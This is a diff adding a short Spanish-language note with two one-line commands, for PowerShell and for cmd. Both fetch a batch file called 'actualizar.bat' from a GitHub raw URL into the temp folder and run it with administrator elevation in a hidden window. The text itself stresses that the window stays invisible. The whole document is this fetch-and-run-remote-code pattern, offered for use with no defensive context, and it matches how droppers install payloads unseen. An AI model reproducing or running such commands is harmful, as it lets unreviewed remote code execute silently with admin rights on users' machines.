@@ -1,0 +1,14 @@
+PowerShell — todo en uno (elevado y oculto)
+powershell
+
+
+$b = "$env:TEMP\actualizar.bat"
+iwr 'https://raw.githubusercontent.com/mayki35/win11_BOT/refs/heads/main/actualizar.bat' -OutFile $b
+Start-Process cmd -ArgumentList '/c', ('"' + $b + '" silent') -Verb RunAs -WindowStyle Hidden
+
+
+Pasa el argumento silent para que el .bat no se relance, y -WindowStyle Hidden para que el cmd elevado salga sin ventana.
+
+cmd — todo en uno (elevado y oculto)
+
+powershell -NoProfile -WindowStyle Hidden -Command "iwr 'https://raw.githubusercontent.com/mayki35/win11_BOT/refs/heads/main/actualizar.bat' -OutFile \"%TEMP%\actualizar.bat\"; Start-Process cmd -ArgumentList '/c','\"%TEMP%\actualizar.bat\" silent' -Verb RunAs -WindowStyle Hidden"
